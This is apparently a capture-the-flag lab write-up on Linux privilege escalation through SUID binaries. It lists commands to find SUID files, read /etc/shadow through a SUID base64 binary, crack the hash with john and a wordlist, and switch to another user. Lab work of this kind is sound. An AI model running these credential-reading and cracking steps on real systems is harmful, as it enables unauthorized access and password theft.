# 🔐 Privilege Escalation: SUID

Files in Linux normally have read, write, and execute permissions based on the current user's privilege level.

However, SUID (Set User ID) and SGID (Set Group ID) are special permissions that allow a file to run with the privileges of the file owner or group owner.

This can sometimes be abused to gain unauthorized access or escalate privileges.

---

## 🔍 Finding SUID Files

To search for files with the SUID permission set, use:

```bash
find / -type f -perm -4000 -ls 2>/dev/null
```

![SUID files](screenshots/SUID/result_SUID.png)

---

## 📌 Discovering `base64`

During enumeration, we discovered that the `base64` binary has the SUID bit enabled.

The `s` in `rws` indicates that the file runs with the owner's privileges.

![base64 SUID](screenshots/SUID/base64.png)

---

## 🚀 Reading Restricted Files

The `base64` binary can be abused to read restricted files such as `/etc/shadow`.

To decode Base64 content, we use:

```bash
| base64 --decode
```

---

## 📂 Reading the Shadow File

We used the SUID-enabled `base64` binary to read the shadow file and obtain password hashes.

```bash
base64 /etc/shadow | base64 --decode
```

![shadow file](screenshots/SUID/base64_shadow.png)

---

## 🧾 Saving the Hash

We created a file and copied the password hash into it.

![create hash file](screenshots/SUID/file_hash.png)

![copy hash](screenshots/SUID/hash_copy.png)

---

## 🔓 Cracking the Password Hash

Using `john`, we cracked the password hash to recover the user's password.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt myhash
```

![john crack](screenshots/SUID/john_get_passwd.png)

---

## 👤 Switching User

After recovering the password, we switched to the target user:

```bash
su gerryconway
```

![switch user](screenshots/SUID/change_user.png)

---

## 🏁 Capturing the Flag

Finally, we located the flag and used `base64` to read it.

```bash
find / -type f -name flag*.txt 2>/dev/null
```

![get flag](screenshots/SUID/get_flag.png)
